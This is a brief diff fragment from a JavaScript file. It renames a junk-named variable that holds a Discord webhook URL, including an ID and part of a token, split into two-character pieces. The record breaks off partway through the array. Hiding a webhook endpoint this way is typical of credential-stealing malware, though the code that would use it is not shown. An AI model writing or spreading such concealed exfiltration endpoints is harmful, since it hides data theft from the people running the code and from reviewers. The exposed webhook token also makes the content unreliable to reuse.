@@ -1,4 +1,4 @@
-const diejwjdhjejdawawdwjwawdawd69 = [
+const diejwjdhjejdawawdwjwawdawd = [
   'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 
   'ap', 'i/', 'we', 'bh', 'oo', 'ks', '/1', '35', '26', '34', 
   '05', '38', '40', '60', '52', '05', '/7', 'oh', 'fc', 'LF', 
